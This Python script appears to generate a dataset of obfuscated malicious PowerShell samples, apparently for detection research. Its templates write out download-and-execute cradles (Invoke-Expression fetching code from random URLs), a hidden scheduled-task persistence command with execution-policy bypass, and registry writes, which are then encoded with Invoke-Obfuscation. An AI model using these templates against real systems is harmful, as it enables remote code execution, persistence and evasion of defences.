#Generates a powershell script from the set of random malicious commands
import random
import string
import pexpect
import os
import sys
import math
import multiprocessing
import time
import queue

def get_random_dest():
	path = "/" + "".join([random.choice(string.ascii_letters + string.digits) for _ in range(random.randint(5,10))])
	if(random.randint(0,1) == 0):
		#Return a domain
		ext = "." + "".join([random.choice(string.ascii_lowercase) for _ in range(random.randint(2,3))])
		hostname = "".join([random.choice(string.ascii_letters) for _ in range(random.randint(10,20))])
		domain = "http://" + hostname + ext + path
		return domain
	else:
		ip = "http://" + str(random.randint(0,200)) + "." + str(random.randint(0,200)) + "." + str(random.randint(0,200))+ "." + str(random.randint(0,200))
		return ip + path

def get_random_text(min, max):
	return "".join([random.choice(string.ascii_letters + string.digits) for _ in range(random.randint(min,max))])

def get_random_word():
	return get_random_text(3,10)

def get_random_regkey():
	key_name = get_random_word()
	key_location = "HKCU:\\" + "\\".join([get_random_word() for _ in range(random.randint(2,5))])
	return key_location, key_name

def get_random_shellcode():
	shellcode = ",".join([hex(random.randint(0,255)) for _ in range(150)])
	return shellcode

def remote_payload_cmd():
	dest = get_random_dest()
	return "Invoke-Expression (New-Object Net.WebClient).DownloadString(\"" + dest + "\") \n"

#https://blog.cobaltstrike.com/2013/11/09/schtasks-persistence-with-powershell-one-liners/
def schtasks_persistence_cmd():
	cmd = "schtasks /create /tn OfficeUpdatorB /tr \"c:\\windows\\system32\\WindowsPowerShell\\v1.0\\powershell.exe -WindowStyle hidden -NoLogo -NonInteractive -ep bypass -nop -c "
	cmd += "'" + remote_payload_cmd()[:-1] + "'\" /sc onidle /i 30 \n"
	return cmd

def set_registry_key_cmd():
	key_location, key_name = get_random_regkey()
	cmd = f"Set-ItemProperty '{key_location}' -Name '{key_name}' -Value {get_random_text(50,100)}\n"
	return cmd

def inject_shellcode_cmd():
	cmd = "[Byte[]] $Shellcode = @(" + get_random_shellcode() + ") \n";
	cmd += "".join(open("./scripts/inject_shellcode.ps1").readlines())
	return cmd

# commands = [remote_payload_cmd, schtasks_persistence_cmd, set_registry_key_cmd, inject_shellcode_cmd]
commands = [["remote_payload_cmd",remote_payload_cmd], 
			["schtasks_persistence_cmd",schtasks_persistence_cmd], 
			["set_registry_key_cmd",set_registry_key_cmd]] # inject shellcode seems to be broken when we try to obfuscate it :c

# Testing:
#commands = [remote_payload_cmd]

def generate_script():
	script = ""
	choice = random.choice(commands)

	return choice[1](),choice[0]

invoke_obfuscation_choices = ["Out-ObfuscatedTokenCommand","Out-ObfuscatedStringCommand", "Out-SecureStringCommand -PassThru"] #"Out-ObfuscatedAST" doesnt work for some reason

invoke_obfuscation_encodings = ["Out-EncodedAsciiCommand", "Out-EncodedBXORCommand", "Out-EncodedBinaryCommand", "Out-EncodedHexCommand", "Out-EncodedOctalCommand", "Out-EncodedSpecialCharOnlyCommand", "Out-EncodedWhitespaceCommand"]


# Testing
#invoke_obfuscation_choices = ["Out-ObfuscatedStringCommand"]
#invoke_obfuscation_encodings = ["Out-EncodedAsciiCommand"]

def obfuscate(script_num):

	# Generate unobfuscated script
	script, base_choice = generate_script()
	f = open(f"res/dataset-{script_num}-raw.ps1",'w')
	f.write(script)
	f.close()

	# Obfuscate it
	failed = False 
	obfs_choice = random.choice(invoke_obfuscation_choices)

	#print(f"> Obfuscating script #{script_num}, commands for Invoke-Obfuscation = {obfs_choice}")

	p = pexpect.spawn(f"pwsh -Command \"Import-Module ./Invoke-Obfuscation/Invoke-Obfuscation.psd1; {obfs_choice} -Path ./res/dataset-{str(script_num)}-raw.ps1\" > ./res/dataset-{str(script_num)}-obfs.ps1 2>> ./res/err.log")
	p.wait()

	# Encode sometimes
	# NOTE: Encoding is very inconsistent (maybe 25% success rate?) so let's just encode everything and pretend we "chose" not to encode the ones that failed
	encoded = False
	if(random.randint(0,10) > -1):
		encoding_choice = random.choice(invoke_obfuscation_encodings) + " -PassThru -NoProfile -NonInteractive "
		encoded = True
		encoding_fail = False
		#print(f"> Choosing to encode script #{script_num}, encoding = {obfs_choice}")
		#os.system(f"cat ./res/dataset-{str(script_num)}-obfs.ps1 > ./res/sanity_{str(script_num)}.txt")

		with open(f"./res/dataset-{str(script_num)}-obfs.ps1") as f:
			script = "".join(f.readlines())
			#print(f"> midpoint script = {script}")
			script = "{" + script + "}"
			#p = pexpect.spawn(f"pwsh -Command \"Import-Module ./Invoke-Obfuscation/Invoke-Obfuscation.psd1; {encoding_choice} -Path ./res/dataset-{str(script_num)}-obfs.ps1\" > ./res/dataset-{str(script_num)}-obfs.ps1")
			p = pexpect.spawn(f"pwsh -Command \"Import-Module ./Invoke-Obfuscation/Invoke-Obfuscation.psd1; {encoding_choice} -ScriptBlock {script}\" > ./res/dataset-{str(script_num)}-obfs-enc.ps1 2>> ./res/err.log")
			p.wait()

			try:
				f = open(f"./res/dataset-{str(script_num)}-obfs-enc.ps1")
				f.close()
				os.system(f"rm ./res/dataset-{str(script_num)}-obfs.ps1; mv ./res/dataset-{str(script_num)}-obfs-enc.ps1 ./res/dataset-{str(script_num)}-obfs.ps1")
			except Exception as e:
				#failed = True
				encoded = False #Just pretend the encoding never happened lul
				encoding_fail = True

	# Compress sometimes, WIP
	compressed = False
	# if (random.randint(0,1) == 1):
	# 	compressed = True
	# 	print(f"> Choosing to compress script #{script_num}")
	# 	p = pexpect.spawn(f"pwsh -Command \"Import-Module ./Invoke-Obfuscation/Invoke-Obfuscation.psd1; Out-CompressedCommand -NoProfile -NonInteractive -NoLogo -Path ./res/dataset-{str(script_num)}-obfs.ps1\" > ./res/dataset-{str(script_num)}-obfs.ps1")
	# 	p.wait()

	# Test for success
	with open(f"./res/dataset-{str(script_num)}-obfs.ps1") as f:
		lines = f.readlines()
		#print("> Generated lines = " + "\n".join(lines))

		log = f"echo {str(script_num)},{base_choice},{obfs_choice}"

		if encoded:
			log += "," + encoding_choice
		else:
			if encoding_fail:
				log += ",failed_encoding"
			else:
				log += ",not_encoded"

		if compressed:
			log += ",compressed"
		else:
			log += ",not_compressed"

		if len(lines) == 0 or failed:
			print(f"> !!! Script #{script_num} obfuscation failed!!")
			os.system(f"rm ./res/dataset-{str(script_num)}-obfs.ps1 ./res/dataset-{str(script_num)}-raw.ps1")

			log += " >> ./res/failed.csv"

		else:
			log += " >> ./res/success.csv"
			print(f"> Script #{script_num} obfuscation succeeded!")

		os.system(log)
	p.close()
	return

if __name__ == "__main__":
	print("Generating dataset")
	THREAD_NUM = int(sys.argv[2])
	with multiprocessing.Pool(THREAD_NUM) as p:
		p.map(obfuscate, range(int(sys.argv[1])))